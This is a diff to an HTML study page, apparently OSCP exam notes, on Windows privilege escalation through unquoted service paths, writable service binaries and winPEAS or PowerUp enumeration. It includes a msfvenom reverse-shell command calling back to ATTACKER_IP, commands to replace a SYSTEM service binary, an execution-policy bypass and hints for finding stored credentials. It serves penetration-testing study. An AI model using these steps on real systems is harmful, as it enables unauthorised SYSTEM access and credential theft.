@@ -247,33 +247,109 @@ wmic service get name,displayname,pathname,startmode</code></pre>
             <div class="section-header">7. Unquoted Service Paths</div>
             <div class="section-content">
 
-                <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto"</code></pre>
+                <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto"
 
-                <p>If path contains spaces and no quotes → possible hijack.</p>
+OR (better):
+Get-CimInstance Win32_Service | Select Name,PathName,StartName</code></pre>
 
-                Example:
+                <p><b>Definition:</b> A service path without quotes may allow Windows to interpret and execute a
+                    different binary if intermediate paths are writable.</p>
+
+                <p><b>Example:</b></p>
+
                 <pre><code>C:\Program Files\Vulnerable App\service.exe</code></pre>
 
-                Place malicious executable in:
-                <pre><code>C:\Program.exe</code></pre>
+                <p><b>Potential hijack targets:</b></p>
+
+                <pre><code>C:\Program.exe
+C:\Program Files\Vulnerable.exe</code></pre>
+
+                <p><b>IMPORTANT CONDITIONS (must ALL be true):</b></p>
+
+                <ul>
+                    <li>Path contains spaces</li>
+                    <li>No quotes around executable path</li>
+                    <li>You have WRITE permissions on one of the intermediate folders</li>
+                </ul>
+
+                <p><b>Reality check:</b></p>
+                <p>❗ Unquoted path alone is NOT enough. Without write permissions → NOT exploitable.</p>
 
             </div>
         </div>
+
 
         <div class="section">
-            <div class="section-header">8. Service Binary Hijacking</div>
-            <div class="section-content">
+    <div class="section-header">8. Service Binary Hijacking</div>
+    <div class="section-content">
 
-                <pre><code>icacls "C:\Path\To\ServiceBinary.exe"</code></pre>
+        <p>Check for services running as System</p>
 
-                <p>If writable and service runs as SYSTEM → replace binary.</p>
 
-                <pre><code>sc stop ServiceName
+<pre><code>        Get-CimInstance Win32_Service |
+Where-Object {$_.StartName -like "*LocalSystem*"} |
+Select Name, State, StartMode, StartName</code></pre>
+
+<p>Check if we can work with it</p>
+
+<pre><code>icacls "C:\Path\To\ServiceBinary.exe"
+sc qc ServiceName</code></pre>
+
+<p><b>Definition:</b> If a service binary is writable and runs as SYSTEM, it can be replaced with a malicious executable.</p>
+
+<p><b>EXPLOIT CONDITIONS:</b></p>
+
+<ul>
+    <li>Service runs as LocalSystem</li>
+    <li>Binary is writable (BUILTIN\Users / Everyone / Authenticated Users)</li>
+    <li>Service can be restarted OR system reboot possible</li>
+</ul>
+
+<p><b>How to generate malicious executable:</b></p>
+
+<pre><code># Reverse shell payload (SYSTEM context)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o malicious.exe</code></pre>
+
+<p><b>Execution logic:</b></p>
+
+<pre><code>Service runs as SYSTEM
+→ Service executes binary from disk
+→ Binary replaced with malicious.exe
+→ SYSTEM shell returned to attacker</code></pre>
+
+<p><b>Exploitation:</b></p>
+
+<pre><code># Stop service (if allowed)
+sc stop ServiceName
+
+# Backup original (recommended)
+copy ServiceBinary.exe ServiceBinary.bak
+
+# Replace binary
 copy malicious.exe ServiceBinary.exe
+
+# Start service
 sc start ServiceName</code></pre>
 
-            </div>
-        </div>
+<p><b>IMPORTANT NOTES:</b></p>
+
+<ul>
+    <li>❗ Many SYSTEM services cannot be stopped manually</li>
+    <li>❗ File may be locked while service is running</li>
+    <li>✔ Restart capability (CanRestart) is often the real trigger</li>
+</ul>
+
+<p><b>OSCP RULE:</b></p>
+
+<pre><code>WRITE + SYSTEM + EXECUTION TRIGGER = EXPLOIT</code></pre>
+
+<p><b>KEY REMINDER:</b></p>
+
+<pre><code>You are NOT "escalating privileges" with the EXE.
+You are hijacking a SYSTEM execution context.</code></pre>
+
+    </div>
+</div>
 
         <div class="section">
             <div class="section-header">9. DLL Hijacking</div>
@@ -426,15 +502,171 @@ wmic qfe get HotFixID</code></pre>
             <div class="section-header">14. Automated Enumeration</div>
             <div class="section-content">
 
-                <pre><code>winPEAS.exe
-PowerUp.ps1
-Seatbelt.exe</code></pre>
+                <pre><code># winPEAS (no installation needed)
+.\winPEASx64.exe
+# or
+.\winPEAS.exe
 
-                Always manually verify findings.
+# PowerUp (PowerShell script - must be loaded first)
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Unblock-File .\PowerUp.ps1
+. .\PowerUp.ps1
+Invoke-AllChecks
+
+# Seatbelt (compiled binary)
+.\Seatbelt.exe -group=all</code></pre>
+
+                <p><b>Key Concept:</b> These tools only <b>find</b> misconfigurations — they do NOT exploit anything
+                    automatically.</p>
+
+                <p><b>Always manually verify findings:</b></p>
+
+                <pre><code># Example verification commands
+icacls "C:\Program Files\..."
+Get-CimInstance Win32_Service
+schtasks /query /fo LIST /v</code></pre>
+
+                <hr>
+
+                <p><b>How to analyze PowerUp results:</b></p>
+
+                <pre><code>PRIORITY FILTER:
+
+1. SYSTEM context
+   - StartName: LocalSystem
+   - NT AUTHORITY\SYSTEM
+
+2. WRITE access
+   - ModifiableFile
+   - ModifiableService
+   - Writable registry keys
+   - Writable PATH directories
+
+3. Execution control
+   - CanRestart: True
+   - Service restart possible
+   - Scheduled task triggers
+
+4. EXPLOIT RULE:
+   WRITE + SYSTEM + EXECUTION = PRIVESC</code></pre>
+
+                <p><b>What to look for in PowerUp:</b></p>
+
+                <ul>
+                    <li>Writable service binaries running as SYSTEM</li>
+                    <li>Modifiable services (Invoke-ServiceAbuse candidates)</li>
+                    <li>Unquoted service paths + writable directories</li>
+                    <li>Writable PATH hijack opportunities</li>
+                    <li>AutoLogon / registry stored credentials</li>
+                </ul>
+
+                <hr>
+
+                <p><b>How to analyze winPEAS results:</b></p>
+
+                <pre><code>PRIORITY FILTER (winPEAS noise is HIGH):
+
+1. Highlighted "RED" or "IMPORTANT" sections
+   → start here always
+
+2. Services section
+   - Writable service binaries
+   - Unquoted paths
+   - Auto-start services as SYSTEM
+
+3. Files / Folders
+   - Writable Program Files subfolders
+   - Config files (.config, .xml, .ini)
+
+4. Credentials
+   - .xml / .config / .ini files
+   - Browser / app stored passwords
+   - AutoLogon registry entries
+
+5. Interesting misconfigs
+   - AlwaysInstallElevated
+   - Token privileges
+   - Scheduled tasks running as SYSTEM</code></pre>
+
+                <p><b>winPEAS mindset:</b></p>
+
+                <ul>
+                    <li>Do NOT read everything</li>
+                    <li>Focus only on RED / HIGH IMPACT sections</li>
+                    <li>Cross-check manually with icacls / services / schtasks</li>
+                </ul>
+
+                <hr>
+
+                <p><b>OSCP mindset summary:</b></p>
+
+                <pre><code>TOOLS = discovery only
+
+REAL SKILL = identify:
+
+- Where can I write?
+- What runs as SYSTEM?
+- How is it triggered?
+
+If all 3 match → EXPLOIT exists</code></pre>
+                <p><b>Example: How to interpret a real finding</b></p>
+
+                <p><b>PowerUp Output:</b></p>
+
+                <pre><code>ServiceName: GPGOrchestrator
+Path: "C:\Program Files\MilleGPG5\GPGService.exe"
+StartName: LocalSystem
+ModifiableFileIdentityReference: BUILTIN\Users
+CanRestart: True</code></pre>
+
+                <p><b>Analysis:</b></p>
+
+                <pre><code>1. Runs as SYSTEM → HIGH IMPACT
+2. Binary is writable → code execution possible
+3. Service can restart → execution trigger exists
+
+RESULT:
+→ Replace binary → SYSTEM shell</code></pre>
+
+                <hr>
+
+                <p><b>Example: winPEAS Output</b></p>
+
+                <pre><code>[!] Interesting Services - POSSIBLE PRIV ESC
+    C:\Program Files\VulnApp\service.exe
+    Permissions: BUILTIN\Users (Full Control)
+    Runs as: LocalSystem</code></pre>
+
+                <p><b>Analysis:</b></p>
+
+                <pre><code>1. Highlighted as interesting → likely misconfig
+2. Writable service binary
+3. Runs as SYSTEM
+
+RESULT:
+→ Replace service.exe OR inject payload → SYSTEM</code></pre>
+
+                <hr>
+
+                <p><b>Key OSCP Pattern Recognition</b></p>
+
+                <pre><code>PowerUp / winPEAS give different views:
+
+PowerUp:
+→ structured, confirms exploitability
+
+winPEAS:
+→ noisy, shows "interesting" hints
+
+FINAL DECISION RULE:
+If BOTH show:
+- Writable file/service
+- SYSTEM context
+
+→ EXPLOIT IMMEDIATELY</code></pre>
 
             </div>
         </div>
-
         <div class="section">
             <div class="section-header">15. OSCP Mental Checklist</div>
             <div class="section-content">
